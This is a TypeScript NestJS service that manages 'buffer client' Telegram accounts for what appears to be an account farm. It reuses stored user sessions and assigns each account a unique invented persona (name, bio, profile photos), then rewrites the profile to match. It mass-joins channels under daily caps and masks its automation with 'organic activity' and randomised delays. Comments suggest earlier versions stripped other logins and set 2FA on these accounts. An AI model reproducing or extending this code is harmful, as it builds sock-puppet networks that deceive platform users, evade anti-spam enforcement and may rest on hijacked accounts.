import { ChannelsService } from './../channels/channels.service';
import { Channel } from '../channels/schemas/channel.schema';
import { ActiveChannel } from '../active-channels';
import {
    BadRequestException,
    ConflictException,
    HttpException,
    Inject,
    Injectable,
    InternalServerErrorException,
    NotFoundException,
    forwardRef,
} from '@nestjs/common';
import { InjectModel } from '@nestjs/mongoose';
import { Model } from 'mongoose';
import { CreateBufferClientDto } from './dto/create-buffer-client.dto';
import {
    BufferClient,
    BufferClientDocument,
} from './schemas/buffer-client.schema';
import { TelegramService } from '../Telegram/Telegram.service';
import { sleep } from 'telegram/Helpers';
import { Api } from 'telegram';
import { UsersService } from '../users/users.service';
import { ActiveChannelsService } from '../active-channels/active-channels.service';
import { ClientService } from '../clients/client.service';
import { UpdateBufferClientDto } from './dto/update-buffer-client.dto';
import { PromoteClientService } from '../promote-clients/promote-client.service';
import { parseError } from '../../utils/parseError';
import { fetchWithTimeout } from '../../utils/fetchWithTimeout';
import { notifbot } from '../../utils/logbots';
import { connectionManager } from '../Telegram/utils/connection-manager';
import { SessionService } from '../session-manager';
import { SearchBufferClientDto } from './dto/search-buffer-client.dto';
import { channelInfo } from '../../utils/telegram-utils/channelinfo';
import { Client } from '../clients';
import isPermanentError from '../../utils/isPermanentError';
import { PersonaPool, PersonaAssignment, generateCandidateCombinations, personaKey } from '../../utils/persona-assignment';
import { nameMatchesAssignment, lastNameMatches } from '../../utils/homoglyph-normalizer';
import { BotsService, ChannelCategory } from '../bots';
import {
    BaseClientUpdate,
    BaseClientService,
    ClientStatusType,
    ClientConfig,
    performOrganicActivity,
    WarmupPhase,
} from '../shared/base-client.service';
import { ClientHelperUtils } from '../shared/client-helper.utils';

@Injectable()
export class BufferClientService extends BaseClientService<BufferClientDocument> {

    private promoteClientService: PromoteClientService;

    constructor(
        @InjectModel('bufferClientModule')
        private bufferClientModel: Model<BufferClientDocument>,
        @Inject(forwardRef(() => TelegramService))
        telegramService: TelegramService,
        @Inject(forwardRef(() => UsersService))
        usersService: UsersService,
        @Inject(forwardRef(() => ActiveChannelsService))
        activeChannelsService: ActiveChannelsService,
        @Inject(forwardRef(() => ClientService))
        clientService: ClientService,
        @Inject(forwardRef(() => ChannelsService))
        channelsService: ChannelsService,
        @Inject(forwardRef(() => PromoteClientService))
        promoteClientServiceRef: PromoteClientService,
        @Inject(forwardRef(() => SessionService))
        sessionService: SessionService,
        botsService: BotsService,
    ) {
        super(
            telegramService,
            usersService,
            activeChannelsService,
            clientService,
            channelsService,
            sessionService,
            botsService,
            BufferClientService.name,
        );
        this.promoteClientService = promoteClientServiceRef;
    }

    private async getPrimaryClientMobiles(clientId?: string | null): Promise<Set<string>> {
        const clients = await this.clientService.findAll();
        const primaryClientMobiles = new Set(
            clients
                .filter((client) => !!client.mobile && (!clientId || client.clientId === clientId))
                .map((client) => client.mobile),
        );
        this.logger.debug('Resolved primary client mobiles for buffer guards', {
            clientId: clientId || 'all',
            count: primaryClientMobiles.size,
        });
        return primaryClientMobiles;
    }

    private isPrimaryClientMobile(mobile: string, primaryClientMobiles: Set<string>): boolean {
        return !!mobile && primaryClientMobiles.has(mobile);
    }

    // ---- Abstract implementations ----

    get model(): Model<BufferClientDocument> {
        return this.bufferClientModel;
    }

    get clientType(): 'buffer' {
        return 'buffer';
    }

    get config(): ClientConfig {
        return {
            joinChannelInterval: 6 * 60 * 1000,      // 6 minutes
            leaveChannelInterval: 120 * 1000,          // 120 seconds
            leaveChannelBatchSize: 10,
            channelProcessingDelay: 120000,             // 120s (redesigned from 20s)
            channelTarget: 200,                         // Reduced from 350
            maxJoinsPerSession: 8,                      // NEW: max 8 per session
            maxNewClientsPerTrigger: 10,
            minTotalClients: 10,
            maxMapSize: 100,
            cooldownHours: 2,
            clientProcessingDelay: 10000,               // 10s between clients
            maxChannelJoinsPerDay: 20,
            joinsPerMobilePerRound: 3,
        };
    }

    // ---- Buffer-specific: updateNameAndBio (uses full client.name) ----

    async updateNameAndBio(doc: BufferClientDocument, client: Client, failedAttempts: number): Promise<number> {
        const telegramClient = await connectionManager.getClient(doc.mobile, { autoDisconnect: false, handler: false });
        try {
            await performOrganicActivity(telegramClient, 'medium');

            const me = await telegramClient.getMe();
            await sleep(ClientHelperUtils.gaussianRandom(7500, 1250, 5000, 10000));

            let updateCount = 0;

            if ((client.firstNames?.length > 0) || (client.bufferLastNames?.length > 0) || (client.bios?.length > 0) || (client.profilePics?.length > 0)) {
                // ── PERSONA BRANCH ──────────────────────────────────────────
                let assignment: Pick<PersonaAssignment, 'assignedFirstName' | 'assignedLastName' | 'assignedBio' | 'assignedProfilePics'> | null = null;

                // 1. Check if doc already has a valid assignment (any assigned field set AND pool version matches)
                const hasValidAssignment = (
                    doc.assignedFirstName != null ||
                    doc.assignedLastName != null ||
                    doc.assignedBio != null
                );

                if (hasValidAssignment) {
                    assignment = {
                        assignedFirstName: doc.assignedFirstName,
                        assignedLastName: doc.assignedLastName,
                        assignedBio: doc.assignedBio,
                        assignedProfilePics: doc.assignedProfilePics,
                    };
                } else {
                    // 2. Atomic assignment via findOneAndUpdate with guard
                    const pool: PersonaPool = {
                        firstNames: client.firstNames,
                        lastNames: client.bufferLastNames || [],
                        bios: client.bios || [],
                        profilePics: client.profilePics || [],
                        dbcoll: client.dbcoll,
                    };

                    // Query existing assignments for dedup (buffer collection)
                    const existingAssignments: Array<{ mobile: string; assignedFirstName: string; assignedLastName?: string; assignedBio?: string; assignedProfilePics?: string[] }> = await this.model.find({
                        clientId: doc.clientId, status: 'active',
                        mobile: { $ne: doc.mobile },
                        $or: [
                            { assignedFirstName: { $ne: null } },
                            { assignedLastName: { $ne: null } },
                            { assignedBio: { $ne: null } },
                            { 'assignedProfilePics.0': { $exists: true } },
                        ],
                    }, { mobile: 1, assignedFirstName: 1, assignedLastName: 1, assignedBio: 1, assignedProfilePics: 1 }).lean();

                    // Cross-collection dedup: also fetch promote assignments (best-effort)
                    try {
                        const promoteAssignments = await this.promoteClientService.model.find({
                            clientId: doc.clientId, status: 'active',
                            mobile: { $ne: doc.mobile },
                            $or: [
                                { assignedFirstName: { $ne: null } },
                                { assignedLastName: { $ne: null } },
                                { assignedBio: { $ne: null } },
                                { 'assignedProfilePics.0': { $exists: true } },
                            ],
                        }, { mobile: 1, assignedFirstName: 1, assignedLastName: 1, assignedBio: 1, assignedProfilePics: 1 }).lean();
                        existingAssignments.push(...promoteAssignments);
                    } catch { /* cross-collection dedup is best-effort */ }

                    const activeClientAssignment = await this.clientService.getActiveClientAssignment(client);
                    if (activeClientAssignment && activeClientAssignment.mobile !== doc.mobile && !existingAssignments.some(a => a.mobile === activeClientAssignment.mobile)) {
                        existingAssignments.push(activeClientAssignment);
                    }

                    const usedKeys = new Set(existingAssignments.map(a => personaKey({
                        firstName: a.assignedFirstName,
                        lastName: a.assignedLastName || '',
                        bio: a.assignedBio || '',
                        profilePics: a.assignedProfilePics || [],
                    })));

                    const candidates = generateCandidateCombinations(pool, doc.mobile);
                    const chosen = candidates.find(c => !usedKeys.has(personaKey(c)));

                    if (!chosen) {
                        this.logger.warn(`No unique persona candidate available for ${doc.mobile}, falling back to first candidate`);
                    }

                    const pick = chosen || candidates[0];
                    if (pick) {
                        const result = await this.model.findOneAndUpdate(
                            {
                                mobile: doc.mobile,
                                $or: [
                                    {
                                        assignedFirstName: null,
                                        assignedLastName: null,
                                        assignedBio: null,
                                        'assignedProfilePics.0': { $exists: false },
                                    },
                                ],
                            },
                            { $set: {
                                assignedFirstName: pick.firstName,
                                assignedLastName: pick.lastName || null,
                                assignedBio: pick.bio || null,
                                assignedProfilePics: pick.profilePics,
                            } },
                            { new: true },
                        );

                        if (result) {
                            assignment = {
                                assignedFirstName: result.assignedFirstName,
                                assignedLastName: result.assignedLastName,
                                assignedBio: result.assignedBio,
                                assignedProfilePics: result.assignedProfilePics,
                            };
                            this.logger.log(`Assigned persona "${pick.firstName}" to ${doc.mobile}`);
                        } else {
                            this.logger.warn(`Atomic persona assignment failed for ${doc.mobile} (guard condition not met)`);
                        }
                    }
                }

                // 3. Apply persona corrections if we have an assignment
                const hasAnyAssignment = assignment != null && (
                    assignment.assignedFirstName != null ||
                    assignment.assignedLastName != null ||
                    assignment.assignedBio != null
                );
                if (hasAnyAssignment) {
                    // Read current TG profile state once (needed for lastName and bio checks)
                    const fullUser = await telegramClient.client.invoke(new Api.users.GetFullUser({ id: new Api.InputUserSelf() }));
                    const currentLastName: string = (fullUser as any)?.users?.[0]?.lastName || '';
                    const currentBio: string = (fullUser as any)?.fullUser?.about || '';

                    // Check firstName mismatch
                    const firstNameWrong = assignment?.assignedFirstName != null
                        && !nameMatchesAssignment(me.firstName || '', assignment.assignedFirstName);
                    // Check lastName mismatch (only when assignedLastName is non-null)
                    const lastNameWrong = assignment?.assignedLastName != null
                        && !lastNameMatches(currentLastName, assignment.assignedLastName);

                    if (firstNameWrong || lastNameWrong) {
                        const displayFirstName = assignment.assignedFirstName || me.firstName || '';
                        const displayLastName = assignment.assignedLastName || '';
                        this.logger.log(`Updating persona name/lastName for ${doc.mobile}`);
                        await performOrganicActivity(telegramClient, 'medium');
                        await telegramClient.client.invoke(new Api.account.UpdateProfile({
                            firstName: displayFirstName,
                            lastName: displayLastName,
                        }));
                        updateCount++;
                        await sleep(ClientHelperUtils.gaussianRandom(5000, 1000, 3000, 7000));
                    }

                    // Check and update bio if assignedBio is non-null and mismatches
                    if (assignment.assignedBio != null && currentBio !== assignment.assignedBio) {
                        this.logger.log(`Updating persona bio for ${doc.mobile}`);
                        await performOrganicActivity(telegramClient, 'light');
                        await sleep(ClientHelperUtils.gaussianRandom(12500, 3000, 8000, 18000));
                        await telegramClient.client.invoke(new Api.account.UpdateProfile({ about: assignment.assignedBio }));
                        updateCount++;
                    }
                }
            } else {
                this.logger.debug(`Skipping identity update for ${doc.mobile}: no persona assignment available yet`);
            }

            await this.update(doc.mobile, {
                ...(updateCount > 0 ? { nameBioUpdatedAt: new Date() } : {}),
                lastUpdateAttempt: new Date(),
                failedUpdateAttempts: 0,
                lastUpdateFailure: null,
                organicActivityAt: new Date(),
            });
            this.logger.debug(`Updated name and bio for ${doc.mobile}`);
            await sleep(ClientHelperUtils.gaussianRandom(40000, 5000, 30000, 50000));
            return updateCount;
        } catch (error: unknown) {
            const errorDetails = this.handleError(error, 'Error updating profile', doc.mobile);
            await this.update(doc.mobile, {
                lastUpdateAttempt: new Date(),
                failedUpdateAttempts: failedAttempts + 1,
                lastUpdateFailure: new Date(),
            });
            if (isPermanentError(errorDetails)) {
                const reason = await this.buildPermanentAccountReason(errorDetails.message, telegramClient);
                await this.markAsInactive(doc.mobile, reason);
            }
            return 0;
        } finally {
            await this.safeUnregisterClient(doc.mobile);
        }
    }

    // ---- Buffer-specific: updateUsername (sets username via updateUsernameForAClient) ----

    async updateUsername(doc: BufferClientDocument, client: Client, failedAttempts: number): Promise<number> {
        const telegramClient = await connectionManager.getClient(doc.mobile, { autoDisconnect: false, handler: false });
        try {
            await performOrganicActivity(telegramClient, 'light');

            const me = await telegramClient.getMe();
            await sleep(ClientHelperUtils.gaussianRandom(7500, 1250, 5000, 10000));
            await this.telegramService.updateUsernameForAClient(doc.mobile, client.clientId, client.name, me.username);
            await this.update(doc.mobile, {
                usernameUpdatedAt: new Date(),
                lastUpdateAttempt: new Date(),
                failedUpdateAttempts: 0,
                lastUpdateFailure: null,
                organicActivityAt: new Date(),
            });
            this.logger.debug(`Updated username for ${doc.mobile}`);
            await sleep(ClientHelperUtils.gaussianRandom(40000, 5000, 30000, 50000));
            return 1;
        } catch (error: unknown) {
            const errorDetails = this.handleError(error, 'Error updating username', doc.mobile);
            await this.update(doc.mobile, {
                lastUpdateAttempt: new Date(),
                failedUpdateAttempts: failedAttempts + 1,
                lastUpdateFailure: new Date(),
            });
            if (isPermanentError(errorDetails)) {
                const reason = await this.buildPermanentAccountReason(errorDetails.message, telegramClient);
                await this.markAsInactive(doc.mobile, reason);
            }
            return 0;
        } finally {
            await this.safeUnregisterClient(doc.mobile);
        }
    }

    // ---- CRUD (buffer-specific) ----

    async create(bufferClient: CreateBufferClientDto): Promise<BufferClientDocument> {
        const result = await this.bufferClientModel.create({
            ...bufferClient,
            status: bufferClient.status || 'active',
        });
        this.logger.log(`Buffer Client Created:\n\nMobile: ${bufferClient.mobile}`);
        this.botsService.sendMessageByCategory(ChannelCategory.ACCOUNT_NOTIFICATIONS, `Buffer Client Created:\n\nMobile: ${bufferClient.mobile}`);
        return result;
    }

    async findAll(status?: ClientStatusType): Promise<BufferClientDocument[]> {
        const filter = status ? { status } : {};
        return this.bufferClientModel.find(filter).exec();
    }

    async findOne(mobile: string, throwErr: boolean = true): Promise<BufferClientDocument> {
        const bufferClient = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();
        if (!bufferClient && throwErr) {
            throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);
        }
        return bufferClient;
    }

    async update(mobile: string, updateClientDto: BaseClientUpdate): Promise<BufferClientDocument> {
        const updatedBufferClient = await this.bufferClientModel
            .findOneAndUpdate({ mobile }, { $set: updateClientDto }, { new: true, returnDocument: 'after' })
            .exec();
        if (!updatedBufferClient) {
            throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);
        }
        return updatedBufferClient;
    }

    async createOrUpdate(mobile: string, createorUpdateBufferClientDto: CreateBufferClientDto | UpdateBufferClientDto): Promise<BufferClientDocument> {
        const existingBufferClient = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();
        if (existingBufferClient) {
            return this.update(existingBufferClient.mobile, createorUpdateBufferClientDto as UpdateBufferClientDto);
        } else {
            const createDto: CreateBufferClientDto = {
                ...createorUpdateBufferClientDto,
                status: (createorUpdateBufferClientDto as CreateBufferClientDto).status || 'active',
            } as CreateBufferClientDto;
            return this.create(createDto);
        }
    }

    async remove(mobile: string, message?: string): Promise<void> {
        try {
            const bufferClient = await this.findOne(mobile, false);
            if (!bufferClient) {
                throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);
            }
            this.logger.log(`Removing BufferClient with mobile: ${mobile}`);
            await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Deleting Buffer Client : ${mobile}\n${message}`)}`);
            await this.bufferClientModel.deleteOne({ mobile }).exec();
        } catch (error) {
            const errorDetails = parseError(error, `failed to delete BufferClient: ${mobile}`);
            this.logger.error(`Error removing BufferClient with mobile ${mobile}: ${errorDetails.message}`);
            throw new HttpException(errorDetails.message, errorDetails.status);
        }
        this.logger.log(`BufferClient with mobile ${mobile} removed successfully`);
    }

    async search(filter: SearchBufferClientDto): Promise<BufferClientDocument[]> {
        if (filter.tgId === "refresh") {
            this.updateAllClientSessions().catch((error) => {
                this.logger.error('Error updating all client sessions:', error);
            });
            return [];
        }
        return await this.bufferClientModel.find(filter).exec();
    }

    async executeQuery(query: Record<string, any>, sort?: Record<string, any>, limit?: number, skip?: number): Promise<BufferClientDocument[]> {
        if (!query) {
            throw new BadRequestException('Query is invalid.');
        }
        try {
            const queryExec = this.bufferClientModel.find(query);
            if (sort) queryExec.sort(sort);
            if (limit) queryExec.limit(limit);
            if (skip) queryExec.skip(skip);
            return await queryExec.exec();
        } catch (error) {
            if (error instanceof BadRequestException || error instanceof NotFoundException) throw error;
            const errorMessage = error instanceof Error ? error.message : 'Unknown error occurred';
            throw new InternalServerErrorException(`Query execution failed: ${errorMessage}`);
        }
    }

    async updateStatus(mobile: string, status: ClientStatusType, message?: string): Promise<BufferClientDocument> {
        const updateData: UpdateBufferClientDto = { status };
        if (message) updateData.message = message;
        await this.botsService.sendMessageByCategory(ChannelCategory.ACCOUNT_NOTIFICATIONS, `Buffer Client:\n\nStatus Updated to ${status}\nMobile: ${mobile}\nReason: ${message || ''}`);
        return await this.update(mobile, updateData);
    }

    async refillJoinQueue(clientId?: string | null): Promise<number> {
        if (this.isJoinChannelProcessing || this.isLeaveChannelProcessing) return 0;
        if (this.telegramService.hasActiveClientSetup()) return 0;

        this.resetDailyJoinCountersIfNeeded();
        const primaryClientMobiles = await this.getPrimaryClientMobiles(clientId);
        const excludedMobiles = new Set([
            ...this.joinChannelMap.keys(),
            ...primaryClientMobiles,
        ]);

        const query: Record<string, any> = {
            status: 'active',
            channels: { $lt: this.config.channelTarget },
            mobile: { $nin: Array.from(excludedMobiles) },
        };
        if (clientId) query.clientId = clientId;
        this.logger.debug('Refill join queue query prepared', {
            clientId: clientId || 'all',
            excludedCount: excludedMobiles.size,
        });

        const eligible = await this.bufferClientModel
            .find(query)
            .sort({ channels: 1 })
            .limit(this.config.maxMapSize)
            .exec();

        let added = 0;
        let leaveAdded = 0;
        for (const doc of eligible) {
            if (this.isPrimaryClientMobile(doc.mobile, primaryClientMobiles)) {
                this.logger.debug(`Skipping refill candidate ${doc.mobile}: it is the live client mobile`);
                continue;
            }
            if (this.isMobileDailyCapped(doc.mobile)) continue;
            try {
                const client = await connectionManager.getClient(doc.mobile, { autoDisconnect: false, handler: false });
                const channels = await channelInfo(client.client, true);
                await this.update(doc.mobile, { channels: channels.ids.length });

                if (channels.canSendFalseCount < 10) {
                    const remaining = this.config.maxChannelJoinsPerDay - this.getDailyJoinCount(doc.mobile);
                    const channelsToJoin = await this.fetchJoinableChannels(channels.ids.length, remaining, channels.ids);
                    if (channelsToJoin.length === 0) continue;

                    if (this.safeSetJoinChannelMap(doc.mobile, channelsToJoin)) {
                        added++;
                    }
                } else if (!this.leaveChannelMap.has(doc.mobile)) {
                    if (this.safeSetLeaveChannelMap(doc.mobile, channels.canSendFalseChats)) {
                        leaveAdded++;
                    }
                }
            } catch (error) {
                const errorDetails = parseError(error, `RefillJoinQueueErr: ${doc.mobile}`);
                if (isPermanentError(errorDetails)) {
                    const reason = await this.buildPermanentAccountReason(errorDetails.message);
                    await this.markAsInactive(doc.mobile, reason);
                }
            } finally {
                await this.safeUnregisterClient(doc.mobile);
            }
        }

        if (added > 0) {
            this.logger.log(`Refilled join queue with ${added} buffer clients`);
        }
        if (leaveAdded > 0 && !this.leaveChannelIntervalId) {
            this.createTimeout(() => this.leaveChannelQueue(), ClientHelperUtils.gaussianRandom(6500, 1000, 5000, 8000));
        }

        return added;
    }

    private async fetchJoinableChannels(currentChannels: number, limit: number, excludedIds: string[]): Promise<(Channel | ActiveChannel)[]> {
        const capped = Math.min(limit, 25);
        if (capped <= 0) return [];
        return currentChannels < 220
            ? this.activeChannelsService.getActiveChannels(capped, 0, excludedIds)
            : this.channelsService.getActiveChannels(capped, 0, excludedIds);
    }

    async markAsInactive(mobile: string, reason: string): Promise<BufferClientDocument | null> {
        try {
            this.logger.log(`Marking buffer client ${mobile} as inactive: ${reason}`);
            return await this.updateStatus(mobile, 'inactive', reason);
        } catch (error) {
            const errorMessage = error instanceof Error ? error.message : 'Unknown error';
            this.logger.error(`Failed to mark buffer client ${mobile} as inactive: ${errorMessage}`);
            return null;
        }
    }

    // ---- Buffer-specific: Enrollment (redesigned — no 2FA, no removeOtherAuths, no createNewSession) ----

    async setAsBufferClient(
        mobile: string,
        clientId: string,
        availableDate: string = ClientHelperUtils.getTodayDateString()
    ) {
        const user = (await this.usersService.search({ mobile, expired: false }))[0];
        if (!user) throw new BadRequestException('user not found');

        const isExist = await this.findOne(mobile, false);
        if (isExist) throw new ConflictException('BufferClient already exist');

        const clients = await this.clientService.findAll();
        const clientMobiles = clients.map((client) => client?.mobile);
        if (clientMobiles.includes(mobile)) throw new BadRequestException('Number is an Active Client');

        const telegramClient = await connectionManager.getClient(mobile, { autoDisconnect: false });
        try {
            // Only get channel info — no 2FA, no profile changes, no new session
            const channels = await this.telegramService.getChannelInfo(mobile, true);
            await sleep(ClientHelperUtils.gaussianRandom(7500, 1250, 5000, 10000));

            const bufferClient: CreateBufferClientDto = {
                tgId: user.tgId,
                session: user.session, // Use old trusted session directly
                mobile: user.mobile,
                availableDate,
                channels: channels.ids.length,
                clientId,
                status: 'active',
                message: 'Enrolled for warmup',
                lastUsed: null,
            };
            await this.bufferClientModel
                .findOneAndUpdate({ mobile: user.mobile }, {
                    $set: {
                        ...bufferClient,
                        warmupPhase: WarmupPhase.ENROLLED,
                        warmupJitter: ClientHelperUtils.generateWarmupJitter(),
                        enrolledAt: new Date(),
                    }
                }, { new: true, upsert: true })
                .exec();
        } catch (error) {
            const errorDetails = parseError(error, `Failed to set as Buffer Client ${mobile}`);
            // Retire permanently dead accounts at the source
            if (isPermanentError(errorDetails)) {
                try { await this.usersService.update(user.tgId, { expired: true }); } catch { }
            }
            throw new HttpException(errorDetails.message, errorDetails.status);
        } finally {
            await this.safeUnregisterClient(mobile);
        }
        return 'Client enrolled as buffer successfully';
    }

    // ---- Buffer-specific: Check & process buffer clients ----

    async checkBufferClients() {
        if (this.telegramService.hasActiveClientSetup()) {
            this.logger.warn('Ignored active check buffer channels as active client setup exists');
            return;
        }
        const clients = await this.clientService.findAll();
        const promoteClients = await this.promoteClientService.findAll();
        const clientMap = new Map(clients.map((client) => [client.clientId, client]));
        const now = Date.now();

        await this.selfHealLegacyOperationalState();

        const clientMainMobiles = clients.map((c) => c.mobile);
        const assignedBufferClients = await this.bufferClientModel
            .find({ clientId: { $exists: true, $ne: null }, status: 'active' })
            .exec();
        const assignedBufferMobiles = assignedBufferClients.map((doc) => doc.mobile);

        const goodIds = [
            ...clientMainMobiles,
            ...promoteClients.map((c) => c.mobile),
            ...assignedBufferMobiles,
        ].filter(Boolean);

        const bufferClientsPerClient = new Map<string, number>();
        for (const doc of assignedBufferClients) {
            if (!doc.clientId) continue;
            bufferClientsPerClient.set(doc.clientId, (bufferClientsPerClient.get(doc.clientId) || 0) + 1);
        }

        let totalUpdates = 0;
        this.logger.debug(`Checking buffer clients, good IDs count: ${goodIds.length}`);

        // Collect buffer clients for priority-sorted processing
        const bufferClientsToProcess: Array<{
            bufferClient: BufferClientDocument;
            client: Client;
            clientId: string;
            priority: number;
        }> = [];

        for (const bufferClient of assignedBufferClients) {
            if (!bufferClient.clientId) continue;
            const client = clientMap.get(bufferClient.clientId);
            if (!client) continue;
            if (bufferClient.mobile === client.mobile) {
                this.logger.debug(`Skipping buffer maintenance for ${bufferClient.mobile}: currently attached as primary client mobile`);
                continue;
            }
            if (bufferClient.inUse === true) continue;

            const lastUpdateAttempt = bufferClient.lastUpdateAttempt ? new Date(bufferClient.lastUpdateAttempt).getTime() : 0;
            if (this.isOnCooldown(bufferClient.mobile, bufferClient.lastUpdateAttempt, now)) continue;

            const lastUsed = ClientHelperUtils.getTimestamp(bufferClient.lastUsed);
            if (lastUsed > 0) {
                await this.backfillTimestamps(bufferClient.mobile, bufferClient, now);
                continue;
            }

            const warmupPhase = bufferClient.warmupPhase || WarmupPhase.ENROLLED;
            const failedAttempts = bufferClient.failedUpdateAttempts || 0;
            const lastAttemptAgeHours = lastUpdateAttempt > 0
                ? (now - lastUpdateAttempt) / (60 * 60 * 1000)
                : 10000;
            const warmupBoost = warmupPhase !== WarmupPhase.READY && warmupPhase !== WarmupPhase.SESSION_ROTATED ? 5000 : 0;
            const priority = warmupBoost + lastAttemptAgeHours - (failedAttempts * 100);

            bufferClientsToProcess.push({ bufferClient, client, clientId: bufferClient.clientId, priority });
        }

        // Sort by priority (highest first)
        bufferClientsToProcess.sort((a, b) => b.priority - a.priority);

        // Process in priority order using base class processClient
        for (const { bufferClient, client } of bufferClientsToProcess) {
            if (totalUpdates >= this.MAX_UPDATES_PER_CYCLE) break;
            const warmupPhase = bufferClient.warmupPhase || WarmupPhase.ENROLLED;
            if (warmupPhase === WarmupPhase.READY || warmupPhase === WarmupPhase.SESSION_ROTATED) {
                const lastChecked = bufferClient.lastChecked ? new Date(bufferClient.lastChecked).getTime() : 0;
                const healthCheckPassed = await this.performHealthCheck(bufferClient.mobile, lastChecked, now);
                if (!healthCheckPassed) continue;
            }
            const currentUpdates = await this.processClient(bufferClient, client);
            if (currentUpdates > 0) totalUpdates += currentUpdates;
        }

        // Dynamic availability: add new buffer clients if needed
        const clientNeedingBufferClients: Array<{
            clientId: string;
            totalNeeded: number;
            windowNeeds: Array<{ window: string; available: number; needed: number; targetDate: string; minRequired: number }>;
            totalActive: number;
            totalNeededForCount: number;
            calculationReason: string;
            priority: number;
        }> = [];

        for (const client of clients) {
            const availabilityNeeds = await this.calculateAvailabilityBasedNeedsForCurrentState(client.clientId);
            if (availabilityNeeds.totalNeeded > 0) {
                clientNeedingBufferClients.push({ clientId: client.clientId, ...availabilityNeeds });
            }
        }

        clientNeedingBufferClients.sort((a, b) => a.priority - b.priority);

        let totalSlotsNeeded = 0;
        for (const clientNeed of clientNeedingBufferClients) {
            const allocated = Math.min(clientNeed.totalNeeded, this.config.maxNewClientsPerTrigger - totalSlotsNeeded);
            if (allocated > 0) totalSlotsNeeded += allocated;
            if (totalSlotsNeeded >= this.config.maxNewClientsPerTrigger) break;
        }

        const totalActiveBufferClients = await this.bufferClientModel.countDocuments({ status: 'active' });
        await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Buffer Client Check:\n\nTotal Active: ${totalActiveBufferClients}\nSlots Needed: ${totalSlotsNeeded}`)}`);

        if (clientNeedingBufferClients.length > 0 && totalSlotsNeeded > 0) {
            await this.addNewUserstoBufferClientsDynamic([], goodIds, clientNeedingBufferClients, bufferClientsPerClient);
        }
    }

    // ---- Buffer-specific: updateInfo ----

    async updateInfo() {
        const primaryClientMobiles = await this.getPrimaryClientMobiles();
        const clients = await this.bufferClientModel
            .find({ status: 'active', lastChecked: { $lt: new Date(Date.now() - 5 * this.ONE_DAY_MS) } })
            .sort({ channels: 1 })
            .limit(25);

        const now = Date.now();
        for (let i = 0; i < clients.length; i++) {
            const client = clients[i];
            if (this.isPrimaryClientMobile(client.mobile, primaryClientMobiles)) {
                this.logger.debug(`Skipping buffer health check for ${client.mobile}: currently attached as primary client mobile`);
                continue;
            }
            const lastChecked = client.lastChecked ? new Date(client.lastChecked).getTime() : 0;
            await this.performHealthCheck(client.mobile, lastChecked, now);
            if (i < clients.length - 1) {
                await sleep(ClientHelperUtils.gaussianRandom(16000, 2500, 12000, 20000));
            }
        }
    }

    // ---- Buffer-specific: Channel joining entry point ----

    async joinchannelForBufferClients(skipExisting: boolean = true, clientId?: string): Promise<string> {
        if (this.telegramService.hasActiveClientSetup()) {
            return 'Active client setup exists, skipping';
        }

        this.logger.log('Starting join channel process for buffer clients');

        // Don't destroy in-flight joins — skip if still processing
        if (this.isJoinChannelProcessing || this.isLeaveChannelProcessing) {
            this.logger.warn('Join/leave processing still in progress, skipping re-entry');
            return 'Join/leave still processing, skipped';
        }

        // Store clientId scope so refills stay within the same client
        this.joinScopeClientId = clientId || null;

        const primaryClientMobiles = await this.getPrimaryClientMobiles(clientId);
        const preservedMobiles = await this.prepareJoinChannelRefresh(skipExisting);
        const query: Record<string, any> = {
            channels: { $lt: this.config.channelTarget },
            mobile: { $nin: Array.from(new Set([...preservedMobiles, ...primaryClientMobiles])) },
            status: 'active',
        };
        if (clientId) query.clientId = clientId;
        this.logger.info('Prepared buffer join-channel sweep', {
            clientId: clientId || 'all',
            preservedCount: preservedMobiles.size,
            primaryClientCount: primaryClientMobiles.size,
        });

        const clients = await this.bufferClientModel.find(query).sort({ channels: 1 }).limit(this.config.maxMapSize);

        const joinSet = new Set<string>();
        const leaveSet = new Set<string>();
        let successCount = 0;
        let failCount = 0;

        for (let i = 0; i < clients.length; i++) {
            const document = clients[i];
            const mobile = document.mobile;

            try {
                const client = await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
                const channels = await channelInfo(client.client, true);
                await this.update(mobile, { channels: channels.ids.length });

                if (channels.canSendFalseCount < 10) {
                    const excludedIds = channels.ids;
                    const result = channels.ids.length < 220
                        ? await this.activeChannelsService.getActiveChannels(25, 0, excludedIds) // Reduced from 150 to 25
                        : await this.channelsService.getActiveChannels(25, 0, excludedIds);

                    if (!this.joinChannelMap.has(mobile)) {
                        if (this.safeSetJoinChannelMap(mobile, result)) {
                            joinSet.add(mobile);
                        }
                    }
                    // No session creation during warmup — use existing old session
                } else {
                    if (!this.leaveChannelMap.has(mobile)) {
                        if (this.safeSetLeaveChannelMap(mobile, channels.canSendFalseChats)) {
                            leaveSet.add(mobile);
                        }
                    }
                }
                successCount++;
            } catch (error) {
                failCount++;
                const errorDetails = parseError(error, `JoinChannelErr: ${mobile}`);
                if (isPermanentError(errorDetails)) {
                    const reason = await this.buildPermanentAccountReason(errorDetails.message);
                    await this.markAsInactive(mobile, reason);
                }
            } finally {
                await this.safeUnregisterClient(mobile);
                if (i < clients.length - 1) {
                    await sleep(ClientHelperUtils.gaussianRandom(this.config.clientProcessingDelay + 2500, 1500, this.config.clientProcessingDelay, this.config.clientProcessingDelay + 5000));
                }
            }
        }

        await sleep(ClientHelperUtils.gaussianRandom(7500, 750, 6000, 9000));

        if (joinSet.size > 0) {
            this.createTimeout(() => this.joinChannelQueue(), 4000 + Math.random() * 2000);
        }
        if (leaveSet.size > 0) {
            this.createTimeout(() => this.leaveChannelQueue(), ClientHelperUtils.gaussianRandom(12500, 1250, 10000, 15000));
        }

        return `Buffer Join queued for: ${joinSet.size}, Leave queued for: ${leaveSet.size}`;
    }

    // ---- Buffer-specific: Create buffer client from user (redesigned — no removeOtherAuths, no 2FA, no new session) ----

    private async createBufferClientFromUser(
        document: { mobile: string; tgId: string },
        targetClientId: string,
        availableDate?: string
    ): Promise<boolean> {
        const telegramClient = await connectionManager.getClient(document.mobile, { autoDisconnect: false });

        try {
            const hasPassword = await telegramClient.hasPassword();
            if (hasPassword) {
                this.logger.debug(`Failed to Update as BufferClient as ${document.mobile} already has Password`);
                await this.updateUser2FAStatus(document.tgId, document.mobile);
                return false;
            }

            // No removeOtherAuths, no set2fa, no createNewSession
